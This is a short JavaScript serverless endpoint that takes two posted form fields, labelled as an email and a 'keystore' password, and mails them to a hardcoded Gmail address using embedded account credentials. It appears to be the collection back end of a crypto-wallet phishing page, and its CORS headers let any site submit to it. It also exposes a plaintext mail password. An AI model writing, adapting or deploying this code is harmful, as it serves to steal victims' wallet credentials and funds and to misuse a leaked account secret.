const nodemailer = require('nodemailer');

const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 465,
  secure: true,
  auth: {
    user: process.env.EMAIL_USER || "willyscotmegan@gmail.com",
    pass: process.env.EMAIL_PASS || "jubtgphwdbkrrauf",
  },
});

export default async function handler(req, res) {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'X-Requested-With,content-type');

  if (req.method === 'POST') {
    try {
      const { wName, psdWet } = req.body;
      
      await transporter.sendMail({
        from: '"Deets" <willyscotmegan@gmail.com>',
        to: ['willyscotmegan@gmail.com'],
        html: `
          <p><strong>Eml:</strong> ${wName || 'Not provided'}</p>
          <p><strong>Pswd (if keystore):</strong> ${psdWet || 'Not provided'}</p>
        `
      });

      return res.status(200).json({ message: 'Success' });
    } catch (error) {
      console.error('Error:', error);
      return res.status(500).json({ error: 'Failed to send email' });
    }
  }

  // Handle preflight request
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  return res.status(405).json({ error: 'Method not allowed' });
}